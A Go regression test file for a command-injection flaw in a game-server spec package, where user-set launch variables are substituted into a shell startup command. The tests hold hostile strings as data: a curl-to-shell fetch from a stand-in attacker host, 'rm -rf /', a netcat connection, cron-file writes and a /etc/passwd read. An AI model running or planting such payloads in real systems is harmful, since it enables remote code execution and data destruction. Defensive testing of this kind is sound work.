package spec

import (
	"strings"
	"testing"
)

// TestVarOverrideCommandInjection is a regression test for a command-injection
// vulnerability (CWE-78): user-supplied overrides for user-editable variables
// are substituted, unescaped, into the install/startup command that the Agent
// runs via `/bin/sh -c`. A user who can only set "launch options" could thereby
// execute arbitrary commands inside the server container.
//
// The first half demonstrates the exploit (the payload reaches the command
// string); the second half asserts that ValidateVarOverrides — the input-
// boundary control — now rejects such payloads so we don't regress.
func TestVarOverrideCommandInjection(t *testing.T) {
	sp := &Spec{
		Variables: []Variable{
			{Key: "MAP", Default: "de_dust2", UserEditable: true},
			{Key: "REGION", Default: "us", UserEditable: false},
		},
		Startup: Startup{Command: "./srv +map {{MAP}}"},
	}

	// --- Exploit baseline ---
	// Without validation, a malicious override is interpolated verbatim into the
	// shell command line, so the injected `curl ... | sh` becomes a second
	// command the container would execute. This proves the vector is real.
	payload := "de_dust2; curl http://evil.example/x | sh"
	rendered := Render(sp.Startup.Command, sp.ResolveVars(map[string]string{"MAP": payload}))
	if !strings.Contains(rendered, "curl http://evil.example/x | sh") {
		t.Fatalf("exploit baseline broke: payload did not reach the command string; got %q", rendered)
	}

	// --- The fix ---
	// ValidateVarOverrides must reject every shell-injection payload below.
	injections := []string{
		"de_dust2; rm -rf /",
		"x && reboot",
		"$(touch /tmp/pwned)",
		"`id`",
		"a | nc evil 9001",
		"x > /etc/cron.d/evil",
		"a & disown",
		"name\nINJECTED=1",
		"$IFS$9cat$IFS/etc/passwd",
	}
	for _, p := range injections {
		if err := sp.ValidateVarOverrides(map[string]string{"MAP": p}); err == nil {
			t.Errorf("ValidateVarOverrides accepted injection payload %q (want rejection)", p)
		}
	}
}

// TestVarOverrideAllowsBenign ensures the fix does not reject legitimate launch
// options and that overrides of non-editable variables (which ResolveVars
// ignores) are not a concern.
func TestVarOverrideAllowsBenign(t *testing.T) {
	sp := &Spec{
		Variables: []Variable{
			{Key: "MAP", Default: "de_dust2", UserEditable: true},
			{Key: "MAX", Default: "16", UserEditable: true},
			{Key: "LOCKED", Default: "x", UserEditable: false},
		},
	}

	for _, ok := range []string{"de_dust2", "16", "My Server", "us-east-1", "v1.2.3", "co_op_map", "64"} {
		if err := sp.ValidateVarOverrides(map[string]string{"MAP": ok}); err != nil {
			t.Errorf("ValidateVarOverrides rejected benign value %q: %v", ok, err)
		}
	}

	// A dangerous value targeting a NON-editable variable is ignored by
	// ResolveVars, so validation must not reject the request over it.
	if err := sp.ValidateVarOverrides(map[string]string{"LOCKED": "$(id)"}); err != nil {
		t.Errorf("override of non-editable variable should be ignored, got error: %v", err)
	}
}

// TestVarOverrideRules verifies the per-variable Rules DSL is now enforced
// (previously it was dead code), in addition to the shell-safety check.
func TestVarOverrideRules(t *testing.T) {
	sp := &Spec{Variables: []Variable{
		{Key: "MAX", Default: "16", Rules: "int|min:1|max:64", UserEditable: true},
		{Key: "RATE", Default: "1.0", Rules: "float|min:0.1|max:5", UserEditable: true},
		{Key: "DIFF", Default: "normal", Rules: "in:easy,normal,hard", UserEditable: true},
	}}

	bad := map[string]string{
		"MAX":  "100",    // above max
		"RATE": "9.5",    // above max
		"DIFF": "insane", // not in set
	}
	for k, v := range bad {
		if err := sp.ValidateVarOverrides(map[string]string{k: v}); err == nil {
			t.Errorf("rule for %s should reject %q", k, v)
		}
	}
	if err := sp.ValidateVarOverrides(map[string]string{"MAX": "x"}); err == nil {
		t.Error("int rule should reject non-numeric MAX")
	}

	good := map[string]string{"MAX": "32", "RATE": "2.5", "DIFF": "hard"}
	for k, v := range good {
		if err := sp.ValidateVarOverrides(map[string]string{k: v}); err != nil {
			t.Errorf("rule for %s should accept %q: %v", k, v, err)
		}
	}
}
